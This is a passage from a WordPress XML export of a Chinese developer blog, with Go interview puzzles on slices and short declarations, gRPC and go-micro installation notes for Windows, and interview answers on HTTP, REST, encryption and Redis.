        func () {
            defer p.deferError()
            m := msg.(int)
            fmt.Println("msg: ", m)
        }()
    }
}

func (p *Project) run(msgchan chan interface{}) {
    for {
        go p.exec(msgchan)
        time.Sleep(time.Second * 2)
    }
}

func (p *Project) Main() {
    a := make(chan interface{}, 100)
    go p.run(a)
    go func() {
        for {
            a &lt;- "1"
            time.Sleep(time.Second)
        }
    }()
    time.Sleep(time.Second * 10)
}

func main() {
    p := new(Project)
    p.Main()
}
</code></pre>

当然，也可以去掉 <code>defer p.deferError()</code> ，改成：

<pre><code class="language-go ">func (p *Project) exec(msgchan chan interface{}) {
    for msg := range msgchan {
        m, ok := msg.(int)
        if !ok {
            fmt.Println("error type!")
            continue
        }
        fmt.Println("msg: ", m)
    }
}
</code></pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4072</wp:post_id>
		<wp:post_date><![CDATA[2018-12-14 17:20:28]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-14 09:20:28]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[golang-%e5%88%b7%e9%a2%98%ef%bc%881%ef%bc%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="%e9%9d%a2%e8%af%95%e9%a2%98"><![CDATA[面试题]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>闲来摸鱼 - 使用 Gitea 、Drone 、Docker Registry 搭建 CI\CD 环境</title>
		<link>https://www.nervgeek.com/2018/12/25/%e9%97%b2%e6%9d%a5%e6%91%b8%e9%b1%bc%e4%bd%bf%e7%94%a8-gitea-%e3%80%81drone-%e3%80%81docker-registry-%e6%90%ad%e5%bb%ba-cicd-%e7%8e%af%e5%a2%83/</link>
		<pubDate>Mon, 24 Dec 2018 16:09:40 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4083</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>
  占坑
</blockquote>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4083</wp:post_id>
		<wp:post_date><![CDATA[2018-12-25 00:09:40]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-24 16:09:40]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e9%97%b2%e6%9d%a5%e6%91%b8%e9%b1%bc%e4%bd%bf%e7%94%a8-gitea-%e3%80%81drone-%e3%80%81docker-registry-%e6%90%ad%e5%bb%ba-cicd-%e7%8e%af%e5%a2%83]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="uncategorized"><![CDATA[未分类]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>[转] - Git命令大全</title>
		<link>https://www.nervgeek.com/2018/12/29/%e8%bd%ac-git%e5%91%bd%e4%bb%a4%e5%a4%a7%e5%85%a8/</link>
		<pubDate>Sat, 29 Dec 2018 09:11:58 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4088</guid>
		<description></description>
		<content:encoded><![CDATA[<script src="https://gist.github.com/guweigang/9848271.js"></script>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4088</wp:post_id>
		<wp:post_date><![CDATA[2018-12-29 17:11:58]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2018-12-29 09:11:58]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[%e8%bd%ac-git%e5%91%bd%e4%bb%a4%e5%a4%a7%e5%85%a8]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="git"><![CDATA[Git]]></category>
		<category domain="post_tag" nicename="git"><![CDATA[Git]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Go 基础面试题 —— slice 的切片、append、range</title>
		<link>https://www.nervgeek.com/2019/04/01/go-%e5%9f%ba%e7%a1%80%e9%9d%a2%e8%af%95%e9%a2%98-slice-%e7%9a%84%e5%88%87%e7%89%87%e3%80%81append%e3%80%81range/</link>
		<pubDate>Mon, 01 Apr 2019 08:58:35 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4102</guid>
		<description></description>
		<content:encoded><![CDATA[<h5>执行以下代码时将打印什么？</h5>

<pre><code class="language-go ">package main

import (
    "fmt"
)

func main() {
    s := []int{1, 2, 3}
    ss := s[1:]
    ss = append(ss, 4)

    for _, v := range ss {
        v += 10
    }

    for i := range ss {
        ss[i] += 10
    }

    fmt.Println(s)
}
</code></pre>

<strong>基础知识点</strong>：<code>slice</code> 是引用类型； <code>append</code> 在 <code>len</code> 大于 <code>cap</code> 的时候会创建新的 <code>slice</code> 执行值拷贝操作；<code>range</code> 的 <code>value</code> 是值拷贝。

<strong>输出</strong>：

<pre><code class="language-bash ">[1, 2, 3]
</code></pre>

<strong>原因</strong>：
首先对 <code>s</code> 进行了切片操作，因为切片操作两个 <code>slice</code> 其实都是共享同一个 <code>array</code> 数组，所以此时对 <code>ss</code> 的元素进行修改， <code>s</code> 也会跟着变化。

然后执行了 <code>append</code> 操作，此时 <code>ss</code> 内 <code>array</code> 的内存指向已经不是 <code>s</code> 的 <code>array</code> 了，所以后面的两个 <code>for</code> 循环都无法对 <code>s</code> 的数据进行更改。

如果把 <code>ss = append(ss, 4)</code> 去掉，那么只有第二个 <code>for</code> 循环能修改值，输出为：<code>[1 12 13]</code> ，因为 <code>range</code> 的 <code>value</code> 是值拷贝，直接对 <code>value</code> 操作不会影响 <code>ss</code> 和 <code>s</code> 的值，第二个 <code>for</code> 循环使用索引来操作，所以可以修改成功。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4102</wp:post_id>
		<wp:post_date><![CDATA[2019-04-01 16:58:35]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-01 08:58:35]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[go-%e5%9f%ba%e7%a1%80%e9%9d%a2%e8%af%95%e9%a2%98-slice-%e7%9a%84%e5%88%87%e7%89%87%e3%80%81append%e3%80%81range]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Go 基础面试题 —— 简短声明</title>
		<link>https://www.nervgeek.com/2019/04/01/go-%e5%9f%ba%e7%a1%80%e9%9d%a2%e8%af%95%e9%a2%98-%e7%ae%80%e7%9f%ad%e5%a3%b0%e6%98%8e/</link>
		<pubDate>Mon, 01 Apr 2019 09:50:47 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4106</guid>
		<description></description>
		<content:encoded><![CDATA[<h5>假设声明x并且未声明y，则下面哪些条款是正确的？</h5>

<pre><code class="language-go ">x, _ := f()
x, _ = f()
x, y := f()
x, y = f()
</code></pre>

<strong>基础知识点</strong>：简短声明的左边必须存在一个新变量。

<strong>输出</strong>：

<pre><code class="language-bash ">x, _ := f() // error
x, _ = f()  // success
x, y := f() // success
x, y = f()  // error
</code></pre>

<strong>原因</strong>：
由于简短声明的左边必须存在一个新变量，而 <code>_</code> 不能被看成一个变量，所以 <code>x, _ := f()</code> 是错误的；<code>x, y = f()</code> 中的 <code>y</code> 是未被声明的变量，所以不能直接赋值。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4106</wp:post_id>
		<wp:post_date><![CDATA[2019-04-01 17:50:47]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-01 09:50:47]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[go-%e5%9f%ba%e7%a1%80%e9%9d%a2%e8%af%95%e9%a2%98-%e7%ae%80%e7%9f%ad%e5%a3%b0%e6%98%8e]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Windows 10 安装 Golang gRpc</title>
		<link>https://www.nervgeek.com/2019/04/28/windows-10-%e5%ae%89%e8%a3%85-golang-grpc/</link>
		<pubDate>Sun, 28 Apr 2019 07:20:42 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4119</guid>
		<description></description>
		<content:encoded><![CDATA[<h3>安装 Protobuf</h3>

<code>Protobuf</code> 会基于 <code>.proto</code> 文件生成各种 grpc 代码文件。

前往：<a href="https://github.com/protocolbuffers/protobuf/releases">Github 地址</a> 下载相对应平台的包，并把 <code>bin</code> 目录加入到环境变量里。

打开命令行，输入 <code>protoc</code> 检验一下。

<h3>安装 gRpc-go</h3>

我是用 <code>proxifier</code> 来代理 <code>git-remote-https.exe</code> 程序，这个是 go 下载第三方库的软件。

<pre><code class="language-bash ">go get google.golang.org/grpc
</code></pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4119</wp:post_id>
		<wp:post_date><![CDATA[2019-04-28 15:20:42]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-04-28 07:20:42]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[windows-10-%e5%ae%89%e8%a3%85-golang-grpc]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="category" nicename="grpc"><![CDATA[grpc]]></category>
		<category domain="post_tag" nicename="grpc"><![CDATA[grpc]]></category>
		<category domain="category" nicename="protobuf"><![CDATA[Protobuf]]></category>
		<category domain="post_tag" nicename="protobuf"><![CDATA[Protobuf]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Windows 10 下的 go-micro 安装笔记（go mod 模式）</title>
		<link>https://www.nervgeek.com/2019/05/09/windows-10-%e4%b8%8b%e7%9a%84-go-micro-%e5%ae%89%e8%a3%85%e7%ac%94%e8%ae%b0%ef%bc%88go-mod-%e6%a8%a1%e5%bc%8f%ef%bc%89/</link>
		<pubDate>Thu, 09 May 2019 03:42:53 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4123</guid>
		<description></description>
		<content:encoded><![CDATA[初次安装 <code>go-micro</code> ，遇到不少问题。

<h3>第一步先安装 go-micro:</h3>

<pre><code class="">go get github.com/micro/go-micro
</code></pre>

<h3>第二步安装 grpc 和 protobuf:</h3>

参考本博客文章：
<a href="https://www.nervgeek.com/2019/04/28/windows-10-%E5%AE%89%E8%A3%85-golang-grpc/" title="Windows 10 安装 Golang gRpc">Windows 10 安装 Golang gRpc</a>

<h3>第三步安装 protoc 的 micro 插件</h3>

用这个插件生成的代码会有 <code>Client API</code> 和 <code>Server API</code> 的代码，减少代码编写量。

<pre><code class="language-bash ">go get github.com/micro/protoc-gen-micro

# 编译的时候记得加上插件
protoc --go_out=plugins=micro:. xxx.go
</code></pre>

<h3>遇到的问题</h3>

然后我跟着 example 写了个 <code>Hello</code> 例子，执行 <code>go run</code> 的时候各种提示 <code>go: error loading module requirements</code>

首先 <code>go.mod</code> 文件添加一下两行 replace：

<pre><code class="language-bash ">// fix: https://github.com/golang/lint/issues/446
replace github.com/golang/lint =&gt; golang.org/x/lint v0.0.0-20190409202823-959b441ac422

// fix: https://github.com/testcontainers/testcontainers-go/issues/47
replace github.com/testcontainers/testcontainer-go =&gt; github.com/testcontainers/testcontainers-go v0.0.0-20190108154635-47c0da630f72
</code></pre>

再执行 <code>go run</code> ，那么依赖缓存的时候就不会提示 <code>go: error loading module requirements</code> 了。

以上步骤我是直接 <code>Porxifiler</code> 全局代理，网络问题是不存在的。当然你可以设置 <code>go proxy</code> 来解决网络问题。]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>4123</wp:post_id>
		<wp:post_date><![CDATA[2019-05-09 11:42:53]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2019-05-09 03:42:53]]></wp:post_date_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[windows-10-%e4%b8%8b%e7%9a%84-go-micro-%e5%ae%89%e8%a3%85%e7%ac%94%e8%ae%b0%ef%bc%88go-mod-%e6%a8%a1%e5%bc%8f%ef%bc%89]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="go-micro"><![CDATA[go-micro]]></category>
		<category domain="post_tag" nicename="go-micro"><![CDATA[go-micro]]></category>
		<category domain="category" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="post_tag" nicename="golang"><![CDATA[Golang]]></category>
		<category domain="category" nicename="grpc"><![CDATA[grpc]]></category>
		<category domain="post_tag" nicename="grpc"><![CDATA[grpc]]></category>
		<category domain="category" nicename="protobuf"><![CDATA[Protobuf]]></category>
		<category domain="post_tag" nicename="protobuf"><![CDATA[Protobuf]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_wpcom_is_markdown]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title>Go 面试题</title>
		<link>https://www.nervgeek.com/2019/06/24/go-%e9%9d%a2%e8%af%95%e9%a2%98/</link>
		<pubDate>Mon, 24 Jun 2019 14:21:38 +0000</pubDate>
		<dc:creator><![CDATA[Mr9esx]]></dc:creator>
		<guid isPermaLink="false">https://www.nervgeek.com/?p=4138</guid>
		<description></description>
		<content:encoded><![CDATA[<h1>Golang_Interview_Question</h1>

<h3>不仅可以保持对面试的敏锐，还可以牢固基础知识点。</h3>

<h3>有些回答是基于我个人项目经验，并不是唯一答案。</h3>

<h5>1. 描述一下你参加过的项目</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>2. HTTP1.1 定义了几种方法？分别有什么用？</h5>

答：

<pre><code class="">定义了八种方法（GET/POST/PUT/HEAD/DELETE/OPTIONS/TRACE/CONNECT），
GET、POST、PUT、DELETE在日常开发中较为常用。

GET 一般使用在获取服务器资源上，该接口仅用于获取资源（HTML\音频\图片\视频\css\js等），不向服务器发送资源，所以应该满足幂等性。

POST 一般使用在新增资源的接口上，基本大部分提交操作都是这个方法。一般不具有幂等性。

PUT 比较少见，有些浏览器甚至不允许 PUT 方法，大多数都是靠 POST 设置 X-HTTP-Method-Override 模拟 PUT 提交。PUT 一般用来更新某个资源，应该满足幂等性。

DELETE 也比较少见，和 PUT 也有一些浏览器不支持 DELETE 操作，也是要靠模拟才能正常发送。
DELETE 一般用来删除某个资源，应该满足幂等性。

HEAD 和 TRACE 我比较少用到。

OPTIONS 一般使用在跨域请求中，判断是否允许访问该资源，返回 'access-control-allow-*' 等字段来控制访问。
</code></pre>

<h5>3. HTTP 状态码分有几类？每个类别分别代表什么</h5>

答：

<pre><code class="">一共五类，1xx\2xx\3xx\4xx\5xx 各为一个大类。

1xx 表示请求已经被接收，继续处理。

2xx 表示请求已经成功被接收。

3xx 表示请求重定向。

4xx 表示客户端请求错误。

5xx 表示服务端出现错误。
</code></pre>

<h5>4. 常用 HTTP 状态码有哪些？分别代表什么？</h5>

答：

<pre><code class="">200 OK ：服务器成功处理请求。

204 No Content：当服务器收到 'OPTIONS' 预请求时返回 204。

301 Moved Permanently：永久的重定向，搜索引擎会替换旧域名。

302 Found：暂时的重定向，搜索引擎不会替换旧域名。

400 Bad Request：请求无效，一般是参数缺失，参数错误导致的请求无效。

401 Unauthorized：未授权，用户无有效身份信息访问需要鉴权接口时返回。

403 Forbidden： 禁止，用户没有权限访问该资源。

404 Not Found：未找到，资源不存在。

405 Method Not Allowed：方法未允许，该 URI 不支持该方法访问。

500 Internal Server Error：内部服务器错误，写的代码出现bug。

502 Bad Gateway：错误网关，在实际开发中遇到一般是代理服务器配置错误。

504 Gateway Timeout：网关超时，在实际开发中遇到一般是代理服务器未启动。
</code></pre>

<h5>5. 400 跟 500 状态码有什么区别？</h5>

答：

<pre><code class="">400 状态码是客户端请求出错，服务器无法接受请求继续处理。
500 状态码是服务器成功接收请求，但在处理请求过程中出现了错误，有可能是代码没有处理请求中不规范的数据或者代码出现了bug。
</code></pre>

<h5>6. 301 跟 302 状态码有什么区别？</h5>

答：

<pre><code class="">301 是永久的重定向，一般在舍弃旧域名的时候使用 301 重定向，客户端可以缓存该网页。
302 是暂时的重定向，只是暂时切换域名的时候使用，客户端必须去请求旧域名。
最大区别在于搜索引擎对他们的对待，搜索引擎（谷歌）会对 301 重定向的域名与旧域名进行替换，而且 302 容易被 URL 劫持。
</code></pre>

<h5>7. POST 和 PUT 有什么区别？</h5>

答：

<pre><code class="">POST 和 PUT 本质意义只是 HTTP 1.1 的规范要求，在规范里，POST 不具备有幂等性，每次 POST 都会新增一个资源；
而 PUT 具有幂等性，只对一个资源修改；在实际开发中，POST 一般用来新建一个资源，PUT 用来更改一个资源。
</code></pre>

<h5>8. RESTFul 了解吗，简单描述一下</h5>

答：

<pre><code class="">我在开发云智洗后端的时候参考了阮一峰老师的 《RESTful API 设计指南》，并根据实际情况尽量抽象出每个实体资源.
在规范中 URL 中不出现动词，用 HTTP 方法来进行 CURD 操作。
对于一些错误的请求，在返回的 JSON 里提供错误码以及错误原因，方便前端判断提示用户具体错误以及解决办法。
但实际开发中还是有很多情况无法完全满足 RESTful API，有时候需要做一定取舍。
</code></pre>

<h5>9. RESTFul 的地址里面允许出现动作名称吗？</h5>

答：

<pre><code class="">RESTful 原则上不允许出现动词，规定使用复数名词。
</code></pre>

<h5>10. RESTFul 风格，如果某种操作无法用 HTTP1.1 定义的方法来表达，该怎么处理？</h5>

答：

<pre><code class="">可以使用 POST 设置 X-HTTP-Method-Override 模拟 PUT、DELETE、PATCH 提交。
</code></pre>

<h5>11. 讲一下当你在浏览器输入网址，然后按下 Enter 键的瞬间，背后发生了什么（越详细越好）</h5>

答：

<pre><code class="">假设我输入的是 "https://www.aliyun.com", 在按下回车键的瞬间，浏览器先判断网址是否合法，是否标明协议否则进行补全；
然后浏览器对网址进行解析，解析的流程是浏览器的 DNS 缓存、操作系统的 Hosts 文件、DNS服务器。
当找到网址对应的 IP 地址之后，浏览器与 Web 服务的 443 端口进行 TCP 的连接，服务端返回数字证书，浏览器用自己的CA公钥去解密证书。
然后发送 HTTP 请求，假如访问的是静态 HTML 代理软件直接获取 HTML 文本返回给浏览器进行页面解析，如果是(TODO)
</code></pre>

<h5>12. DNS 了解吗？简单描述一下流程</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>13. HTTPS 了解吗？简单描述一下流程</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>14. 有没有接触过加密算法？简单描述一下你使用过的加密算法。</h5>

答：

<pre><code class="">有，在平时签名/验证的时候都会使用到 RSA 加密算法，例如生成 ssh key 的时候，一般都使用 RSA 算法生成的公钥私钥。还有生成 SSL 证书和电子签名的时候，使用的也是 RSA 算法。
RSA 是一个不对称加密算法，即私钥加密的数据只有对应的公钥能解密，公钥加密的数据只有对应的私钥能解密。

&lt;!-- 还有另一个接触过的算法是 AES 加密算法，AES 加密算法是一个对称加密算法， --&gt;
</code></pre>

<h5>15. 非对称加密跟对称加密有什么区别？</h5>

答：

<pre><code class="">对称加密即通信的双方都使用同一个秘钥进行加解密，非对称加密一般会有私钥公钥，私钥加密的数据只有对应的公钥能解密，公钥加密的数据只有对应的私钥能解密。
</code></pre>

<h5>16. 分布式有了解吗？怎么解决数据一致性问题？</h5>

答：

<pre><code class=""><br /></code></pre>

<h5>17. Redis 有哪些数据结构？</h5>

答：

<pre><code class="">有 String、List、Set、Hash、Zset 五种类型。
String 是最常用的类型，通过设置唯一的 Key 来获取值，最常用就是用来缓存用户信息，默认空间为 1M，最大是 512M（整数最长为long int）。相关命令有 set、mset、get、mget、incr 等。
List 是一个双向链表而不是数组，可以反向查找和遍历，通过 lpush、lpop、rpush、rpop，可以模拟队列和栈的操作。List 的插入和删除非常快，但索引很慢。
Hash 是一个无序字典，Hash 也能用于缓存用户信息，并且可以只获取部分信息，减少宽带使用，但内存占用较高。
Set 是一个 string 类型的集合，内部元素都是无序且唯一，可以用于去重操作。
Zset 是一个 string 类型的有序集合，不仅确保了元素的唯一性且能给每个元素赋予一个 score，可以用于排序或者延迟队列上。相关命令有 zadd、zrange、zrevrange、zcard、zscore、zrank等。
</code></pre>

<h5>18. 有用过 Redis 哪些高级特性？</h5>

答：

<pre><code class="">在云智洗项目的时候使用了 redis 的 geohash 来计算用户和代收点之间的距离并按距离长度进行排序。将经纬度使用 geohash 算法转变为一维的数值，作为 zset 元素的 score，利用 zset 的特性快速算出距离。
还使用了 set 和 lua 脚本执行实现单机版的分布式锁，用户下单的时候避免网络问题导致的重复提交，根据用户ID和订单单号为 key ，uuid4 生成一个 requestID 为 value 设置一个有超时的元素，释放的时候使用了lua脚本保证 get 与 del 操作是一个原子操作；通过分布式锁保证了下单接口的幂等性。
对于尚未支付的订单超时控制通过 zrangebyscore、zrem 操作 zset 实现了延时队列，以订单号为 key 时间戳为 score，消息获取进程每 100ms 获取到期订单通过消息队列分发到消费者上操作订单。
</code></pre>

<h5>19. Redis 有哪种持久化方式，分别有什么优点跟缺点，原理是怎么样的</h5>

答：

<pre><code class="">Redis 具有 AOF 和 RDB 两种持久化方式。它们可以同时开启，在都开启的情况下 Redis 启动的时候优先加载 AOF 。

RDB 是默认的持久化方式，RDB 有两种备份方式：save 和 bgsave，区别在于是否异步。
save 是同步备份，可以保证数据的一致性，但会导致 redis 同步阻塞。
bgsave 会 fork 一个子进程出来执行数据的备份，但内存占用较多。
配置文件的默认策略是：900 秒至少 1 个 key 变化、300 秒至少 10 个 key 变化和 60 秒至少 10000 个 key 变化。
RDB 的优点在于 RDB 文件是一个单文件，可以方便备份归档成不同版本，也方便传输到其他服务器上面去。
缺点在于很容易造成数据丢失。

AOF 持久化是目前最常用的持久化方式，AOF 文件的原理是记录了每一次修改数据的操作，通过重放操作来达到数据的还原。
AOF 默认关闭，需要在配置文件开启，默认配置是每秒进行一次刷盘，但万一出现问题，你会丢失里 2 秒钟的数据，因为 Redis 会对比上次 fsync 时间是否大于 2 秒。
如果需要最安全的数据备份，可以设置为 always 策略，但性能会下降较多。

缺点在于 AOF 文件相比 RDB 体积会更大，但 Redis 有 bgrewriteaof 机制，会 fork 一个进程来重写 AOF 文件，优化其体积。
在 bgrewriteaof 的时候，当 no-appendfsync-on-rewrite 为 no 的情况下，假如刷盘缓慢，子进程会阻塞主进程的 AOF 操作，导致出现大量的错误信息。
可以把配置改为 yes，主进程的 AOF 操作会暂时写入缓冲区，但如果在此期间发生了问题，也会导致数据丢失。
</code></pre>

<h5>20. Redis 跟 Memcache 的区别</h5>

答：

<pre><code class="">Redis 的定位是基于内存的 kv 数据库，而 Memcache 的定位是基于内存的 kv 缓存系统。
相比之下 Redis 支持五种数据结构的存储，而 Memcache 只支持简单的 key/value 数据结构；Redis 的 value 最大可达 512M ，Memcache 只有 1M。
但在性能上由于 Memcache 是多线程，相比 Redis 的单线程， Memcache 在高并发的场景下性能比 Redis 要好。相比之下由于 Redis 有持久化，所以不需要缓存预热这个过程。
Memcached 不支持集群，只能在客户端做一致性哈希来分区存储，Redis 天生支持集群，可以使用哨兵。
对于两者之间的选型：
在一些数据结构简单，数据持久化要求不高，并发较大的场景下，可以选择 Memcache 来换取更好的性能体现；
而需要持久化保存数据，且需要用到复杂的数据结构并使用到一些 Redis 高级特性（队列、去重、统计、Geohash等）的话，优先选择 Redis。
</code></pre>

<h5>21. 有了解 Redis 事务吗？</h5>

答：

<pre><code class="">Redis 只是一系列操作的集合，不保证事务原子性，不支持回滚，但保证事务隔离性（串行化）。
事务相关 MULTI、EXEC、DISCARD、WATCH、UNWATCH。
</code></pre>

<h5>22. 有了解 Redis 主从同步原理吗？</h5>

答：

<pre><code class="">有，在 xxx 项目中我部署了 Redis 主从同步备份数据，了解过主从同步的原理。
Redis 主从同步分为全量同步和增量同步，首次同步的时候是全量同步，主服务器执行 bgsave 生成 rdb 快照并把新的请求缓存起来，然后从服务器收到 rdb 快照之后清空旧数据，加载 rdb 快照，完成之后主服务器再把缓存中的请求发给从服务器，在此之后一直通过异步进行命令的同步来达到主从同步。
</code></pre>

<h5>23. 有了解 Redis 哨兵机制吗？</h5>

答：

